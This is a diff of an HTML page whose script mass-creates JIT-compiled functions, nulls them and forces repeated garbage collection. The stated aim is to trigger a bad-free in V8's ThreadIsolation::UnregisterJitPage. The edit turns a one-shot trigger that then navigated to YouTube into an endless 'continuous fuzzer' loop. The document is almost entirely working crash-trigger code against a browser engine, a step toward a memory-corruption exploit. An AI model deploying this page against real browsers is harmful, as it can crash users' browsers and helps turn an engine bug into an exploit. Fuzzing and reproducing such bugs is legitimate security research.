@@ -1,66 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>V8 Bad-Free Trigger → YouTube</title>
+  <title>V8 Bad-Free Continuous Fuzzer</title>
 </head>
 <body>
 <script>
-// Optimized for speed: no unnecessary delays, max JIT churn
+// Continuous high-pressure JIT churn fuzzer
+// Targets: ThreadIsolation::UnregisterJitPage (code-memory-access.cc)
 
 function makeJitFunction(seed) {
-  const body = `
+  // Unique, non-inlineable, non-optimizable-yet-JIT-able body
+  return new Function(`
     let a = ${seed};
-    for (let i = 0; i < 2000; i++) a = (a * 1664525 + 1013904223) | 0;
+    for (let i = 0; i < 3000; i++) {
+      a = (a * 1664525 + 1013904223) | 0;
+    }
     return a;
-  `;
-  return new Function(body);
+  `);
 }
 
-function triggerStress() {
-  const funcs = [];
-  const N = 8000; // Push harder
+function fuzzRound() {
+  const N = 6000;
+  const funcs = new Array(N);
 
-  // Phase 1: Rapid JIT allocation
+  // 1. Allocate & JIT many unique functions
   for (let i = 0; i < N; i++) {
-    const f = makeJitFunction(i);
-    f(); // Force compilation
+    const f = makeJitFunction((Math.random() * 1e9) | 0);
+    f(); // Trigger compilation
     funcs[i] = f;
   }
 
-  // Phase 2: Aggressive nulling (make collectible)
-  for (let i = 0; i < N; i += 1) {
+  // 2. Null all to make collectible
+  for (let i = 0; i < N; i++) {
     funcs[i] = null;
   }
 
-  // Force GC if available (no await — sync burst)
+  // 3. Force aggressive sweeping
   if (typeof gc === 'function') {
-    for (let i = 0; i < 15; i++) gc();
+    for (let i = 0; i < 20; i++) gc();
   }
 
-  // Phase 3: Re-allocate under pressure
-  const funcs2 = [];
+  // 4. Allocate another batch immediately
+  const funcs2 = new Array(N);
   for (let i = 0; i < N; i++) {
-    const f = makeJitFunction(i + N);
+    const f = makeJitFunction((Math.random() * 1e9) | 0 + 0x1337);
     f();
     funcs2[i] = f;
   }
   funcs2.length = 0;
 
   if (typeof gc === 'function') {
-    for (let i = 0; i < 10; i++) gc();
+    for (let i = 0; i < 15; i++) gc();
   }
 }
 
-// Run stress immediately and repeatedly — no async delays
-for (let round = 0; round < 8; round++) {
-  triggerStress();
-}
+// Run rounds as fast as possible — no delays, no navigation
+let round = 0;
+while (true) {
+  // Optional: log every 10 rounds (may slow down slightly)
+  // if (++round % 10 === 0) console.log("Fuzz round", round);
 
-// After max stress, navigate to YouTube to trigger full teardown
-// This may cause V8 to sweep JIT pages during context destruction
-setTimeout(() => {
-  location.href = "https://www.youtube.com";
-}, 0);
+  fuzzRound();
+}
 </script>
 </body>
 </html>
